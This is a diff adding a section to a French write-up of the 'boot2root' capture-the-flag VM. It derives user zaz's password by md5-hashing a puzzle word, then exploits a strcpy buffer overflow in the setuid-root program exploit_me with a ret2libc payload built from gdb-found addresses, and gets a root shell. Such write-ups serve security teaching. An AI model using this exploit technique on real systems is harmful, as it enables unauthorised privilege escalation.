@@ -761,5 +761,66 @@ Essayons d'utiliser ce module sur le fichier pour voir le resultat. On va donc r
 scp thor@192.168.1.27:~/turtle ~/boot2root/
 ```
 
-Ensuite on va créer un petit programme en python pour voir ce que ca donne 
+Ensuite on va créer un petit programme en python pour voir ce que ca donne. Après execution de ce dernier en regardant sur l'interface graphique nous remarquons l'apparition de 5 lettres consecutives qui forment le mot SLASH.
 
+Il faudra alors hash SLASH en md5 comme nous laisse entendre la phrase 'Can you digest the message? :)'
+En effet un digest aura une longueur de 32 digits.
+
+```
+thor@BornToSecHackMe:~$ echo -n "SLASH" | md5sum
+646da671ca01bb5d84dbb5fb2238dc8e  -
+thor@BornToSecHackMe:~$ su zaz
+Password:
+zaz@BornToSecHackMe:~$
+```
+
+### ZAZ
+
+Nous sommes en présence d'un repertoire mail et d'un programme exploit_me
+
+En etudiant le programme avec gdb nous voyons que celui ci est vulnérable et ce car il y a un strcpy dans le main.
+
+Cela se confirme lorsque nous essayons de faire segfaul le programme :
+
+```
+(gdb) r `python -c 'print "A" * 200'`
+Starting program: /home/zaz/exploit_me `python -c 'print "A" * 200'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+```
+
+On va donc chercher l'offset a partir duquel le programme segfault et effectuer un ret2libc tout simple pour executer un shell.
+
+Le programme appartenant a l'utilisateur root nous devrions avoir les droits root apres l'exploitation.
+
+L'offset est de 140.
+
+```
+(gdb) p &system
+$1 = (<text variable, no debug info> *) 0xb7e6b060 <system>
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+(gdb) p &exit
+$3 = (<text variable, no debug info> *) 0xb7e5ebe0 <exit>
+```
+
+Montons notre exploit :
+
+```
+./exploit_me `python -c 'print "A" * 140 + "\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7"'`
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+# cd /root
+# ls
+README
+# cat README
+CONGRATULATIONS !!!!
+To be continued...
+#
+```
+
+Et voila nous sommes root !
